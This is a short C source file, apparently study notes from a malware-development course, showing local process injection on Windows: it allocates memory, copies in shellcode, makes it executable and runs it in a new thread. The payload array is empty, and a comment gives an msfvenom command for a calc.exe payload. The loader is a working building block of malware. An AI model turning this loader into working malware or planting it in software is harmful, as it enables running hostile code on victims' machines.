#include <Windows.h>
#include <stdio.h>

/*
Maldev Academy Notes
Local Process Injection
*/


// Payload - msfvenom -p windows/x64/exec CMD=calc.exe -f c 
unsigned char shellcode[] = {
	
};


int main() {
	DWORD dwOldProtection = NULL;

	// Allocate memory in local process with the size of shellcode.
	// Memory permissions set to read and write so that we can write the payload later.
	PVOID pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Print allocated memory address
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Copying the payload to the allocated memory
	memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));

	// Setting memory permissions at pShellcodeAddress to be executable
	VirtualProtect(pShellcodeAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	// Run shellcode under a new thread
	CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;

}